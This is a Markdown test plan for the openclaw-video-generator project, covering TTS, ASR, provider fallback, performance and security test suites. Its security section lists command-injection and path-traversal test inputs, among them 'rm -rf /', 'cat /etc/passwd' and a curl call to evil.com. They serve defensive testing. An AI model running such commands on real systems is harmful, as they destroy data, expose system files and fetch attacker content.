# Comprehensive Test Plan

## Overview

This document provides a comprehensive test plan for the openclaw-video-generator project, covering all API integrations, bug fixes, and critical functionality.

**Version**: v1.4.4
**Last Updated**: 2026-03-14

---

## Test Coverage Matrix

### Provider Coverage

| Provider | TTS | ASR | Tests | Status |
|----------|-----|-----|-------|--------|
| **OpenAI** | ✅ | ✅ | 15 | Primary |
| **Aliyun** | ✅ | ✅ | 8 | v1.4.3 Critical |
| **Azure** | ⚠️ | ⚠️ | 4 | Basic |
| **Tencent** | ⚠️ | ⚠️ | 4 | Basic |

**Total Tests**: 70+

### Feature Coverage

| Feature | Coverage | Priority | Tests |
|---------|----------|----------|-------|
| Multi-Provider TTS | 95% | High | 15 |
| Multi-Provider ASR | 90% | High | 9 |
| Parameter Pollution (v1.4.1/v1.4.4) | 100% | Critical | 16 |
| Provider Fallback | 85% | High | 10 |
| Performance Benchmarks | 80% | Medium | 9 |
| Security Validation | 90% | High | 11 |

### Bug Fix Validation

| Version | Bug | Coverage | Tests | Status |
|---------|-----|----------|-------|--------|
| v1.4.1 | TTS text pollution | 100% | 6 | ✅ Validated |
| v1.4.3 | Aliyun 418 error | 100% | 4 | ✅ Validated |
| v1.4.4 | Remotion props pollution | 100% | 6 | ✅ Validated |

---

## Test Suites

### Suite 1: TTS Providers (`test-tts-providers.sh`)

**Purpose**: Validate text-to-speech functionality across all providers

**Test Categories**:

#### 1.1 OpenAI TTS (5 tests)
- `test_openai_basic`: Basic Chinese text generation
- `test_openai_english`: English text generation
- `test_openai_voices`: Multiple voices (alloy, echo, nova, shimmer)
- `test_openai_speed`: Speed variations (0.5x - 2.0x)
- `test_openai_performance`: Performance benchmark (< 5s target)

**Expected Results**:
- All OpenAI tests pass if API key configured
- Audio files generated successfully
- File size > 1KB
- Performance meets targets

#### 1.2 Aliyun TTS (4 tests) - **CRITICAL FOR v1.4.3**
- `test_aliyun_chinese_zhiqi`: Chinese + Zhiqi voice (no 418 error)
- `test_aliyun_english_catherine`: English + Catherine voice (no 418 error)
- `test_aliyun_mixed_aida`: Mixed language + Aida voice (no 418 error)
- `test_aliyun_smart_mode_auto_select`: Auto voice selection

**Expected Results**:
- NO 418 errors (critical fix in v1.4.3)
- Correct voice auto-selection based on language
- All language combinations work

#### 1.3 Azure TTS (1 test)
- `test_azure_basic`: Basic Chinese text

#### 1.4 Tencent TTS (1 test)
- `test_tencent_basic`: Basic Chinese text

#### 1.5 Edge Cases (3 tests)
- `test_empty_text`: Empty input rejection
- `test_long_text`: Long text handling (1000+ chars)
- `test_special_characters`: Special chars and emojis

**Total Tests**: 15
**Execution Time**: ~5-10 minutes (depends on API latency)

**Run**:
```bash
./tests/api/test-tts-providers.sh
```

---

### Suite 2: ASR Providers (`test-asr-providers.sh`)

**Purpose**: Validate speech recognition and timestamp extraction

**Test Categories**:

#### 2.1 OpenAI Whisper (4 tests)
- `test_openai_whisper_basic`: Chinese transcription
- `test_openai_whisper_english`: English transcription
- `test_openai_whisper_accuracy`: Transcription accuracy validation
- `test_openai_whisper_performance`: Performance benchmark (< 30s target)

**Expected Results**:
- Valid JSON timestamps with start, end, text fields
- Reasonable transcription accuracy
- Performance within targets

#### 2.2 Other Providers (3 tests)
- `test_aliyun_asr_basic`: Aliyun ASR
- `test_azure_asr_basic`: Azure ASR
- `test_tencent_asr_basic`: Tencent ASR

#### 2.3 Edge Cases (2 tests)
- `test_invalid_audio_file`: Invalid file rejection
- `test_missing_audio_file`: Missing file handling

**Total Tests**: 9
**Execution Time**: ~5-10 minutes

**Run**:
```bash
./tests/api/test-asr-providers.sh
```

---

### Suite 3: Parameter Pollution (`test-parameter-pollution.sh`)

**Purpose**: Regression tests for v1.4.1 and v1.4.4 bug fixes

**Test Categories**:

#### 3.1 JSON Cleaning (v1.4.4) - 7 tests
- `test_clean_simple_filename`: File path cleaning
- `test_clean_json_object`: JSON object cleaning
- `test_clean_multiple_metadata_fields`: Multiple metadata
- `test_clean_temperature_metadata`: Temperature metadata
- `test_clean_nested_json`: Nested JSON structures
- `test_clean_already_clean`: Clean input handling
- `test_json_validity`: Output JSON validation

**Test Patterns**:
```
Input:  test.mp3,timeout:30000}
Output: test.mp3

Input:  {"audioPath":"test.mp3"},timeout:1200}
Output: {"audioPath":"test.mp3"}
```

#### 3.2 TTS Text Cleaning (v1.4.1) - 3 tests
- `test_tts_text_cleaning_simulation`: Text cleaning simulation
- `test_tts_nested_metadata`: Nested metadata patterns
- `test_tts_multiple_pollution_patterns`: Multiple patterns

**Test Patterns**:
```
Input:  你好,timeout:30000}
Output: 你好

Input:  测试,maxTokens:1000}
Output: 测试
```

#### 3.3 E2E Integration (3 tests)
- `test_e2e_tts_with_polluted_text`: TTS layer pollution
- `test_e2e_remotion_props_pollution`: Remotion layer pollution
- `test_pollution_regression_suite`: All known patterns

#### 3.4 Security (2 tests)
- `test_command_injection_prevention`: Command injection
- `test_path_traversal_prevention`: Path traversal

**Total Tests**: 16
**Execution Time**: ~2-3 minutes

**Run**:
```bash
./tests/api/test-parameter-pollution.sh
```

**Critical Success Criteria**: 100% pass rate required

---

### Suite 4: Provider Fallback (`test-provider-fallback.sh`)

**Purpose**: Test automatic provider switching and degradation

**Test Categories**:

#### 4.1 TTS Fallback (5 tests)
- `test_tts_auto_fallback`: Automatic fallback
- `test_tts_priority_order`: Priority order validation
- `test_tts_custom_providers_env`: Custom TTS_PROVIDERS
- `test_tts_force_specific_provider`: Force provider with --provider
- `test_tts_invalid_provider_error`: Invalid provider handling

**Expected Behavior**:
- Default order: openai → azure → aliyun → tencent
- Auto-fallback on failure
- Clear error messages

#### 4.2 ASR Fallback (2 tests)
- `test_asr_auto_fallback`: Automatic fallback
- `test_asr_force_specific_provider`: Force specific provider

#### 4.3 Error Handling (3 tests)
- `test_network_timeout_handling`: Timeout handling
- `test_invalid_api_key_error`: Invalid credentials
- `test_clear_error_messages`: Error message quality

**Total Tests**: 10
**Execution Time**: ~3-5 minutes

**Run**:
```bash
./tests/api/test-provider-fallback.sh
```

---

### Suite 5: Performance (`test-performance.sh`)

**Purpose**: Validate performance against targets

**Performance Targets**:

| Operation | Target | Acceptable |
|-----------|--------|------------|
| TTS Short (< 50 chars) | < 5s | < 10s |
| TTS Medium (50-200 chars) | < 10s | < 20s |
| ASR Short (~20s audio) | < 30s | < 60s |
| E2E Short (~20s video) | < 120s | < 180s |

**Test Categories**:

#### 5.1 TTS Performance (3 tests)
- `test_tts_short_text_perf`: Short text benchmark
- `test_tts_medium_text_perf`: Medium text benchmark
- `test_tts_speed_variations`: Speed variation impact

#### 5.2 ASR Performance (1 test)
- `test_asr_short_audio_perf`: ASR benchmark

#### 5.3 E2E Performance (2 tests)
- `test_e2e_short_video_perf`: End-to-end pipeline
- `test_e2e_concurrent_requests`: Concurrent handling (manual)

#### 5.4 Resource Usage (2 tests)
- `test_memory_usage`: Memory consumption (manual)
- `test_disk_usage`: Disk space usage

#### 5.5 Scalability (1 test)
- `test_long_text_scalability`: Long text handling

**Total Tests**: 9
**Execution Time**: ~10-15 minutes

**Run**:
```bash
./tests/api/test-performance.sh
```

---

### Suite 6: Security (`test-security.sh`)

**Purpose**: Validate security measures and prevent vulnerabilities

**Test Categories**:

#### 6.1 API Key Security (3 tests)
- `test_api_key_not_in_logs`: Keys not in logs
- `test_api_key_not_in_error_messages`: Keys not in errors
- `test_api_key_not_in_generated_files`: Keys not in outputs

**Expected Results**:
- No API keys visible anywhere
- Keys properly masked/hidden

#### 6.2 Injection Prevention (4 tests)
- `test_command_injection_tts`: Command injection attacks
- `test_sql_injection_patterns`: SQL injection (N/A)
- `test_path_traversal`: Path traversal attacks
- `test_script_injection_in_json`: Script injection

**Attack Patterns Tested**:
```bash
# Command injection
test; rm -rf /
test && whoami
test | cat /etc/passwd
test $(curl http://evil.com)

# Path traversal
../../../etc/passwd
../../secret.txt
```

#### 6.3 File System Security (2 tests)
- `test_safe_file_permissions`: File permissions
- `test_tmp_file_cleanup`: Temp file cleanup

#### 6.4 Sensitive Data (2 tests)
- `test_no_sensitive_data_in_scenes`: No secrets in scenes
- `test_env_file_not_exposed`: .env in .gitignore

**Total Tests**: 11
**Execution Time**: ~3-5 minutes

**Run**:
```bash
./tests/api/test-security.sh
```

**Critical Success Criteria**: 100% pass rate required

---

## Test Execution

### Quick Test (Core Functionality Only)

```bash
# Run critical tests only
./tests/api/test-parameter-pollution.sh
./tests/api/test-tts-providers.sh
./tests/api/test-security.sh
```

**Time**: ~10-15 minutes

### Full Test Suite

```bash
# Run all tests
./tests/run-all-tests.sh
```

**Time**: ~30-45 minutes

### Individual Suite

```bash
# Run specific suite
./tests/api/test-<suite-name>.sh
```

---

## Test Environment Setup

### Required Configuration

**Minimum** (for basic tests):
```bash
# .env
OPENAI_API_KEY=sk-...
```

**Recommended** (for comprehensive tests):
```bash
# .env
# OpenAI (required)
OPENAI_API_KEY=sk-...

# Aliyun (for v1.4.3 tests)
ALIYUN_ACCESS_KEY_ID=...
ALIYUN_ACCESS_KEY_SECRET=...
ALIYUN_APP_KEY=...

# Azure (optional)
AZURE_SPEECH_KEY=...
AZURE_SPEECH_REGION=...

# Tencent (optional)
TENCENT_SECRET_ID=...
TENCENT_SECRET_KEY=...
TENCENT_APP_ID=...
```

### Dependencies

- **Bash** 4.0+
- **Node.js** 18+
- **jq** (JSON processor)
- **curl** (API calls)
- **ffprobe** (optional, for audio duration)

---

## Success Criteria

### Release Criteria

For ClawHub/npm release, require:

| Suite | Pass Rate | Required |
|-------|-----------|----------|
| Parameter Pollution | 100% | ✅ Critical |
| Security | 100% | ✅ Critical |
| TTS Providers | > 80% | ✅ Required |
| ASR Providers | > 70% | ⚠️ Recommended |
| Provider Fallback | > 70% | ⚠️ Recommended |
| Performance | > 60% | ℹ️ Informational |

### Quality Gates

- **Zero Critical Bugs**: No blocking issues
- **Security Clean**: No vulnerabilities detected
- **Bug Fixes Validated**: v1.4.1, v1.4.3, v1.4.4 verified
- **Core Functionality**: Primary features working

---

## Reporting

### Test Reports

Reports saved in:
```
tests/test-results/
├── tts/
│   └── tts-test-report-<timestamp>.txt
├── asr/
│   └── asr-test-report-<timestamp>.txt
├── pollution/
│   └── pollution-test-report-<timestamp>.txt
├── fallback/
│   └── fallback-test-report-<timestamp>.txt
├── performance/
│   └── performance-report-<timestamp>.txt
├── security/
│   └── security-report-<timestamp>.txt
└── summary/
    └── test-summary-<timestamp>.txt
```

### Report Format

```
Suite Name Test Report
======================
Date: YYYY-MM-DD HH:MM:SS
Total: X
Passed: Y
Failed: Z
Skipped: W

Results:
✅ PASS: test_name_1
✅ PASS: test_name_2
❌ FAIL: test_name_3 - reason
⏭️  SKIP: test_name_4 - not configured
```

---

## Troubleshooting

### Common Issues

#### 1. Tests Skipped

**Cause**: Provider not configured
**Solution**: Add credentials to `.env`

#### 2. Tests Failed

**Cause**: API errors, network issues, rate limits
**Solution**: Check credentials, network, retry

#### 3. Performance Slow

**Cause**: Network latency, API load
**Solution**: Acceptable if < 2x target time

#### 4. Security Fails

**Cause**: Security vulnerability detected
**Solution**: **Must fix before release**

---

## Continuous Integration

### GitHub Actions (Optional)

```yaml
name: API Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Setup Node.js
        uses: actions/setup-node@v2
        with:
          node-version: '18'
      - name: Install dependencies
        run: npm install
      - name: Run tests
        env:
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
        run: ./tests/run-all-tests.sh
```

---

## Maintenance

### Adding New Tests

1. Create test function in appropriate suite
2. Follow naming convention: `test_feature_description()`
3. Update counters: `TOTAL_TESTS`, `PASSED_TESTS`, `FAILED_TESTS`
4. Add to main() execution
5. Update this TEST_PLAN.md

### Updating Performance Targets

Edit `tests/api/test-performance.sh`:
```bash
TARGET_TTS_SHORT=5
TARGET_TTS_MEDIUM=10
TARGET_ASR_SHORT=30
TARGET_E2E_SHORT=120
```

---

## References

- **Test Suites**: `tests/api/test-*.sh`
- **Test Documentation**: `tests/README.md`
- **ClawHub Checklist**: `tests/CLAWHUB_PRE_RELEASE_CHECKLIST.md`
- **Project README**: `README.md`
- **Quick Start**: `QUICKSTART.md`

---

## Contact

- **GitHub**: https://github.com/ZhenRobotics/openclaw-video-generator
- **ClawHub**: https://clawhub.ai/ZhenStaff/video-generator
- **Issues**: https://github.com/ZhenRobotics/openclaw-video-generator/issues
